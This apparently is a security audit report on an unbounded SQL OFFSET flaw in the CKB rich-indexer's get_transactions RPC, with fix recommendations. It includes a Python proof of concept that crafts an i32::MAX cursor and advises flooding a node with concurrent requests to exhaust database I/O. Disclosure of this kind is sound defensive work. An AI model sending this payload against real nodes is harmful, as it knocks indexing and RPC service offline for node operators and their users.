### Title
Unbounded SQL OFFSET via Attacker-Controlled Cursor in `get_transactions` (ungrouped path) — (`util/rich-indexer/src/indexer_handle/async_indexer_handle/get_transactions.rs`)

---

### Summary

An unprivileged RPC caller can craft a 12-byte `after` cursor with bytes 8–11 set to `i32::MAX` (`0x7FFFFFFF` LE) and submit it to `get_transactions` with `group_by_transaction=false/None`. The offset field is decoded and passed **without any bounds check** directly to `query_builder.offset()`, causing the DB engine to execute `SELECT … OFFSET 2147483647`, forcing it to scan and discard up to 2^31 rows per request. There is no per-query timeout on the rich-indexer SQL path, and no rate limiting on the RPC endpoint.

---

### Finding Description

**Cursor format** (ungrouped path): The `after` parameter is validated only for length == 12 bytes. Bytes 0–7 become `last` (i64, used in a `WHERE tx_id >= last` clause) and bytes 8–11 become `offset` (i32, used directly as SQL `OFFSET`). [1](#0-0) 

`decode_i32` performs no bounds check — it accepts any valid i32, including `i32::MAX`: [2](#0-1) 

The decoded `offset` is passed directly to `query_builder.offset()` with no upper-bound guard: [3](#0-2) 

The resulting SQL is:
```sql
SELECT tx_id, block.block_number, ... FROM (...) AS res
JOIN ckb_transaction ON ... JOIN block ON ...
WHERE tx_id >= 0
ORDER BY tx_id ASC
LIMIT <limit> OFFSET 2147483647
```

Both SQLite and PostgreSQL implement `OFFSET` by scanning and discarding the first N rows — there is no index shortcut. The work is O(min(matching_rows, 2^31)) per request.

**No per-query timeout on the SQL path**: The `timeout_limit` field is only wired into the RocksDB-based `IndexerHandle` (via `TimeoutIterator`), not into `AsyncRichIndexerHandle`. The SQL query runs to completion regardless of how long it takes. [4](#0-3) 

**No RPC rate limiting**: The only guard on the RPC layer is a `request_limit` check on the `limit` parameter (number of results returned), which does not constrain the OFFSET value. [5](#0-4) 

---

### Impact Explanation

A single request with `last=0, offset=i32::MAX` forces the DB to scan every row in the transaction index and discard all of them. On a mainnet node with millions of indexed transactions, each such request consumes significant CPU and I/O for the duration of the scan. Because the RPC endpoint is unauthenticated and there is no rate limiting or per-query timeout on this path, an attacker can flood the node with concurrent requests, causing sustained CPU/IO exhaustion that degrades or halts transaction indexing and RPC availability.

---

### Likelihood Explanation

The cursor format is trivially derivable: the length check (exactly 12 bytes) and the LE encoding are observable from any valid `last_cursor` response. The attacker does not need a prior valid cursor — they can construct `[0x00 × 8] ++ [0xFF, 0xFF, 0xFF, 0x7F]` from scratch. The RPC is publicly accessible on any node with the rich-indexer enabled. No special privileges, keys, or hashpower are required.

---

### Recommendation

1. **Clamp the offset**: After decoding, reject or clamp `offset` to a small maximum (e.g., `limit - 1` or a fixed constant like 1000). Legitimate pagination never requires an offset larger than the page size.
2. **Add a per-query timeout** to `AsyncRichIndexerHandle` SQL queries, mirroring the `TimeoutIterator` used in the RocksDB path.
3. **Consider keyset pagination**: Replace the `(last_id, offset)` cursor design with a pure keyset cursor (e.g., `(last_id, last_io_type, last_io_index)`) that avoids SQL `OFFSET` entirely, making pagination O(1) regardless of cursor values.

---

### Proof of Concept

```python
import json, requests, struct

NODE_RPC = "http://127.0.0.1:8114"

# Craft cursor: last_id=0 (tx_id >= 0 = all rows), offset=i32::MAX
last_id  = struct.pack("<q", 0)           # 8 bytes LE i64
offset   = struct.pack("<i", 2147483647)  # 4 bytes LE i32::MAX
cursor   = "0x" + (last_id + offset).hex()

payload = {
    "jsonrpc": "2.0", "id": 1,
    "method": "get_transactions",
    "params": [
        {
            "script": {
                "code_hash": "0x9bd7e06f3ecf4be0f2fcd2188b23f1b9fcc88e5d4b65a8637b17723bbda3cce8",
                "hash_type": "type",
                "args": "0x"
            },
            "script_type": "lock"
        },
        "asc", "0x1", cursor
    ]
}

import time
t0 = time.time()
r = requests.post(NODE_RPC, json=payload)
elapsed = time.time() - t0
print(f"Response time: {elapsed:.2f}s — result: {r.json()}")
# Expected: response time scales with DB size (O(N)), not O(1)
```

Repeat concurrently to exhaust DB I/O and degrade indexer availability.

fn decode_i32(data: &[u8]) -> Result<i32, Error> {
    if data.len() != 4 {
        return Err(Error::Params(
            "unable to convert from bytes to i32 due to insufficient data in little-endian format"
                .to_string(),
        ));
    }
    Ok(i32::from_le_bytes(to_fixed_array(&data[0..4])))
}
